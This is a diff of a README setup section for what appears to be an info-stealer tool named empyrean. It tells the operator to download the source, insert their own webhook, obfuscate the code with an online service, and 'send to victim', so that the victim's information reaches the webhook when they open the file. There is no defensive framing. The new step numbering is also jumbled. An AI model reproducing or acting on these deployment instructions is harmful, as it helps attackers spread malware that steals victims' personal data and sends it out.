@@ -18,13 +18,15 @@
 
 ### < Setup >
 
-1: Put your webhook at ``hook = "X"``
+1. [Download source code zip](https://github.com/addi00000/empyrean/archive/refs/heads/main.zip)
 
-2: Run main.py, you will see your info in the webhook you entered. You need to have python installed to do this, use our built in tool ``Get-Python.bat`` which is located in the **tools** folder to install python!
+2. Extract zip
 
-3: Obfuscate your code here: https://pyobfuscate.com/ (Built in Obfuscator soon!)
+3. Run `install_python.bat` if you don't have python installed
 
-4: Compile it into an exe using our built in tool ``Py-2-Exe.bat`` which is located in the ``tools`` folder!
+1: Replace X with your webhook ``hook = "X"``
+
+3: Obfuscate your code: https://pyobfuscate.com/ (Built in Obfuscator soon!)
 
 5: Send to victim and when they open you will have their info in the webhook provided.
 
